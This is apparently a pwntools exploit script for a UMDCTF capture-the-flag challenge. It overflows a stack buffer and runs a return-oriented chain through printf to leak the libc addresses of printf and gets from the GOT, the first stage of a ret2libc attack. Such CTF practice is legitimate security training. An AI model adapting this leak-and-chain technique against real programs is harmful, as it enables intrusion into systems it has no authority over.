# libc6_2.27-3ubuntu1.4_amd64 
import time

from pwn import *

if __name__ == "__main__":
    context.arch = "amd64"
    
    #io = process("./JNE")
    io = remote("chals5.umdctf.io", 7003)
    io.recvuntil("?\n")

    offset = 0x48
    ret = p64(0x0040101a)
    pop_rdi = p64(0x004013c3)
    printf_got = p64(0x00404038)
    gets_got = p64(0x00404040)
    printf = p64(0x004010f0)
    main = p64(0x00401306)

    payload = b"A" * offset
    payload += ret
    payload += pop_rdi
    payload += printf_got
    payload += printf
    payload += ret
    payload += pop_rdi
    payload += gets_got
    payload += printf
    payload += main

    io.sendline(payload)
    time.sleep(0.5)
    res = io.recv(1024)
    printf_libc = u64(res[:6].ljust(8, b"\x00"))
    gets_libc = u64(res[6:12].ljust(8, b"\x00"))

    print(f"printf libc: {hex(printf_libc)}")
    print(f"gets libc: {hex(gets_libc)}")
    io.close()
